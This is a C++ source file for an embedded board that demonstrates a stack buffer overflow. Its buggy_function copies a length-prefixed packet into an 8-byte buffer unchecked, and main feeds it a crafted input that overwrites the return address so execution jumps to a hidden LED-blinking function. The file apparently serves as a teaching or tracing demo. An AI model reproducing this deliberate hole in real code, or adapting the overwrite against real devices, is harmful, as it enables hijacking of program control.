#include <xpcc/architecture/platform.hpp>

void buggy_function(const uint8_t* packet) {
	asm volatile("");  // force gcc to keep function
	char buffer[8];
	const uint8_t length = packet[0];
	std::memcpy(buffer, packet + 1, length);
}


void secret_function() {
	while(1) {
		Board::LedRed::toggle();
		xpcc::delayMilliseconds(250);
	}
}


volatile int dummy_against_inlining = 0;

int
main()
{
	// initialize
	// do not initialize the system clock in order to maintin a constant
	// frequency of approx. 16 MHz from the internal RC oscillator
	// switching frequencies disturbes the UART like output from the ETM
	// eventually we need to switch to the synchronous TPIU interface
	// which will provide independence from the system clock of our target controller
	//systemClock::enable();

	// enable two gpios so that we can see if the attack worked
	Board::LedRed::setOutput();
	Board::LedGreen::setOutput();

	if(dummy_against_inlining) {
		secret_function();
	}

	const uint8_t good_inp [9] = {8, '0', '1', '2', '3', '4', '5', '6', '7'};
	buggy_function(good_inp);

	// 0xaa for padding; addr: 0x80003a4
	const uint8_t bad_inp [9 + 8] = {8 + 8, '0', '1', '2', '3', '4', '5', '6', '7', 0xaa, 0xaa, 0xaa, 0xaa, 0xa4, 0x03, 0x00, 0x80};
	buggy_function(bad_inp);


	while (1)
	{
		Board::LedGreen::toggle();
		xpcc::delayMilliseconds(250);
	}

	return 0;
}
